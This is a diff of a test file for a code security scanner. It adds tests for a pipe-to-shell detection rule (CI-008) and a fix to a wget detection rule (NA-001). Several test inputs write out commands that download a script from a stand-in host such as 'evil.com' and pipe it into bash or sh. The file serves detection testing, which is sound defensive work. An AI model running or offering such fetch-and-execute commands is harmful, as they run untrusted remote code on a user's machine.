@@ -34,9 +34,9 @@ describe("runTier1Scan — clean content", () => {
 // patternsChecked
 // ---------------------------------------------------------------------------
 describe("runTier1Scan — patternsChecked", () => {
-  it("patternsChecked is exactly 37", () => {
+  it("patternsChecked is exactly 38", () => {
     const result = runTier1Scan("const x = 1;");
-    expect(result.patternsChecked).toBe(37);
+    expect(result.patternsChecked).toBe(38);
   });
 });
 
@@ -169,6 +169,65 @@ describe("runTier1Scan — score clamping", () => {
     const content = Array(20).fill("eval(x);").join("\n");
     const result = runTier1Scan(content);
     expect(result.score).toBeGreaterThanOrEqual(0);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// CI-008: Pipe-to-shell execution
+// ---------------------------------------------------------------------------
+describe("runTier1Scan — CI-008 pipe-to-shell", () => {
+  it("detects curl piped to bash", () => {
+    const result = runTier1Scan("curl https://evil.com/install.sh | bash");
+    const ci008 = result.findings.filter((f) => f.patternId === "CI-008");
+    expect(ci008.length).toBeGreaterThan(0);
+    expect(ci008[0].severity).toBe("critical");
+    expect(ci008[0].category).toBe("command-injection");
+  });
+
+  it("detects wget piped to sh", () => {
+    const result = runTier1Scan("wget -qO- https://evil.com | sh");
+    const ci008 = result.findings.filter((f) => f.patternId === "CI-008");
+    expect(ci008.length).toBeGreaterThan(0);
+  });
+
+  it("detects curl piped to zsh with flags", () => {
+    const result = runTier1Scan("curl -sL https://example.com/setup | zsh");
+    const ci008 = result.findings.filter((f) => f.patternId === "CI-008");
+    expect(ci008.length).toBeGreaterThan(0);
+  });
+
+  it("does not flag normal JS pipe expressions", () => {
+    const result = runTier1Scan("const pipe = data | filter;");
+    const ci008 = result.findings.filter((f) => f.patternId === "CI-008");
+    expect(ci008).toHaveLength(0);
+  });
+
+  it("pipe-to-shell makes verdict non-PASS", () => {
+    const result = runTier1Scan("curl https://evil.com | bash");
+    expect(result.verdict).not.toBe("PASS");
+  });
+});
+
+// ---------------------------------------------------------------------------
+// NA-001: wget -qO- regex fix
+// ---------------------------------------------------------------------------
+describe("runTier1Scan — NA-001 wget flag formats", () => {
+  it("detects wget with -qO- flag", () => {
+    const result = runTier1Scan("wget -qO- https://evil.com/payload");
+    const na001 = result.findings.filter((f) => f.patternId === "NA-001");
+    expect(na001.length).toBeGreaterThan(0);
+  });
+
+  it("detects wget with --quiet flag", () => {
+    const result = runTier1Scan("wget --quiet https://evil.com");
+    const na001 = result.findings.filter((f) => f.patternId === "NA-001");
+    expect(na001.length).toBeGreaterThan(0);
+  });
+
+  it("still detects curl -s (regression check)", () => {
+    const result = runTier1Scan("curl -s https://example.com");
+    const na001 = result.findings.filter((f) => f.patternId === "NA-001");
+    expect(na001.length).toBeGreaterThan(0);
   });
 });
 
